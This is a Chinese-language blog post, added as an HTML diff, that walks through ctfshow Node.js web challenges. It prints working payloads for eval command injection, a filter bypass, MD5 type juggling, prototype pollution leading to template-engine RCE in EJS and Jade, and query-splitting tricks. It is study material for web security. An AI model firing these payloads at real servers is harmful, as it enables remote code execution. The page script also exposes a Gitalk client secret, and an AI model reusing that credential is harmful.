@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]nodejs | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web334
+var findUser = function(name, password){
+  return users.find(function(item){
+    return name!=='CTFSHOW' &amp;&am..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]nodejs</h2>
+            <div class="post-date">2024-04-09</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshownodejs.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web334">web334</h2>
+<pre><code class="language-js">var findUser = function(name, password){
+  return users.find(function(item){
+    return name!=='CTFSHOW' &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;
+  });
+};
+</code></pre>
+<p>查看findUser函数，使用ctfshow/123456登录即可。</p>
+<h2 id="web335">web335</h2>
+<p>考察nodejs中代码执行eval函数。<br>
+参考文章：https://www.anquanke.com/post/id/237032</p>
+<p>使用exec函数没有回显，这里使用execSync函数<br>
+payload</p>
+<pre><code>?eval=require(&quot;child_process&quot;).execSync(&quot;env&quot;);
+</code></pre>
+<h2 id="web336">web336</h2>
+<p>对eval参数进行了过滤<br>
+使用unicode编码绕过</p>
+<p>payload</p>
+<pre><code>?eval=require(&quot;child_process&quot;).exe\u0063Sync(&quot;env&quot;);
+</code></pre>
+<h2 id="web337">web337</h2>
+<pre><code class="language-js">var express = require('express');
+var router = express.Router();
+var crypto = require('crypto');
+
+function md5(s) {
+  return crypto.createHash('md5')
+    .update(s)
+    .digest('hex');
+}
+
+/* GET home page. */
+router.get('/', function(req, res, next) {
+  res.type('html');
+  var flag='xxxxxxx';
+  var a = req.query.a;
+  var b = req.query.b;
+  if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)){
+  	res.end(flag);
+  }else{
+  	res.render('index',{ msg: 'tql'});
+  }
+  
+});
+
+module.exports = router;
+</code></pre>
+<p>要让a!==b,但是md5(a+flag)===md5(b+flag)<br>
+这里利用js的弱类型，使用数组绕过</p>
+<p>payload</p>
+<pre><code>?a[]=1&amp;b[]=1
+</code></pre>
+<h2 id="web338">web338</h2>
+<p>考察js的原型链污染，参考文章：https://xz.aliyun.com/t/12383</p>
+<p>原型链污染就是 我们控制私有属性（proto）指向的原型对象（prototype）， 将其的属性产生变更 那么所继承她的对象 也会拥有这个属性</p>
+<p>login.js</p>
+<pre><code class="language-js">/* GET home page.  */
+router.post('/', require('body-parser').json(),function(req, res, next) {
+  res.type('html');
+  var flag='flag_here';
+  var secert = {};
+  var sess = req.session;
+  let user = {};
+  utils.copy(user,req.body);
+  if(secert.ctfshow==='36dboy'){
+    res.end(flag);
+  }else{
+    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
+  }
+  
+});
+</code></pre>
+<p>使用copy处存在原型链污染</p>
+<p>payload</p>
+<pre><code class="language-json">{
+&quot;__proto__&quot;:
+{&quot;ctfshow&quot;:&quot;36dboy&quot;}
+}
+</code></pre>
+<h2 id="web339">web339</h2>
+<p>api.js中query函数不存在，利用变量覆盖，控制函数。</p>
+<pre><code class="language-json">{&quot;__proto__&quot;:{&quot;query&quot;:&quot;return global.process.mainModule.constructor._load('child_process').execSync('env')&quot;}}
+</code></pre>
+<h2 id="web340">web340</h2>
+<p>需要两层来获取prototype</p>
+<pre><code class="language-json">{&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;query&quot;:&quot;return global.process.mainModule.constructor._load('child_process').execSync('env')&quot;}}}
+
+</code></pre>
+<p><img src="https://fallingskies22.github.io/post-images/1714321387859.png" alt="" loading="lazy"><br>
+<img src="https://fallingskies22.github.io/post-images/1714321393302.png" alt="" loading="lazy"></p>
+<h2 id="web341">web341</h2>
+<p>利用模板渲染进行命令执行<br>
+这里使用了ejs模板</p>
+<p>参考文章：<br>
+https://www.anquanke.com/post/id/236354#h2-3</p>
+<pre><code class="language-json">{&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load('child_process').execSync('env');&quot;,&quot;compileDebug&quot;:true}}}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1714321378875.png" alt="" loading="lazy"></figure>
+<h2 id="web342">web342</h2>
+<h2 id="web343">web343</h2>
+<p>jade模板</p>
+<pre><code class="language-json">{&quot;__proto__&quot;:{&quot;__proto__&quot;: {&quot;type&quot;:&quot;Code&quot;,&quot;compileDebug&quot;:true,&quot;self&quot;:true,&quot;line&quot;:&quot;0, \&quot;\&quot; ));return global.process.mainModule.constructor._load('child_process').execSync('env');//&quot;}}}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://fallingskies22.github.io/post-images/1714321372916.png" alt="" loading="lazy"></figure>
+<h2 id="web344">web344</h2>
+<pre><code class="language-js">router.get('/', function(req, res, next) {
+  res.type('html');
+  var flag = 'flag_here';
+  if(req.url.match(/8c|2c|\,/ig)){
+  	res.end('where is flag :)');
+  }
+  var query = JSON.parse(req.query.query);
+  if(query.name==='admin'&amp;&amp;query.password==='ctfshow'&amp;&amp;query.isVIP===true){
+  	res.end(flag);
+  }else{
+  	res.end('where is flag. :)');
+  }
+
+});
+</code></pre>
+<p>过滤了<code>,</code>，正常的payload被拦截。</p>
+<pre><code>?query={&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;,true}
+</code></pre>
+<p>node.js处理req.query.query的时候，它不像php那样，后面get传的query值会覆盖前面的，而是会把这些值都放进一个数组中。而JSON.parse会把数组中的字符串都拼接到一起，再看满不满足格式，满足就进行解析.</p>
+<pre><code>?query={&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;ctfshow&quot;&amp;query=&quot;isVIP&quot;:true} 
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://fallingskies22.github.io/post-images/1714321355131.png" alt="" loading="lazy"></figure>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/amateursctf-2024-web/">
+                  <h3 class="post-title">
+                    AmateursCTF2024 - Web - Writeup
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
